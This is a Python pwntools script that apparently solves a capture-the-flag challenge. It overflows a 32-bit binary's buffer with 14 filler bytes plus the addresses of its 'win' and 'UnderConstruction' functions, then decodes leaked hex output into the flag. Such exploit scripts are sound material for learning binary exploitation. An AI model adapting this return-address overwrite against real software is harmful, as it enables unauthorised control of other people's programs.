#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'i386')
# HOST = 
# PORT =

binf = ELF(bin_file)

def parse(io):
    io.recvuntil('0x')
    leak = io.recv(8)
    f = ''
    for i in range(0, 7, 2):
        f += chr(int(leak[i:i+2], 16))
    return f

def attack(io):
    payload = b'a' * 14
    payload += p32(binf.sym.win)
    payload += p32(binf.sym.UnderConstruction)

    io.sendlineafter('flag\n', payload) 
    io.recvuntil(': ')

    FLAG = ''
    for i in range(10):
        FLAG += parse(io)
    success('Got the flag: '+FLAG[::-1])

def main():
    io = process(bin_file)
    # io = remote(HOST, PORT)
    attack(io)
    # gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
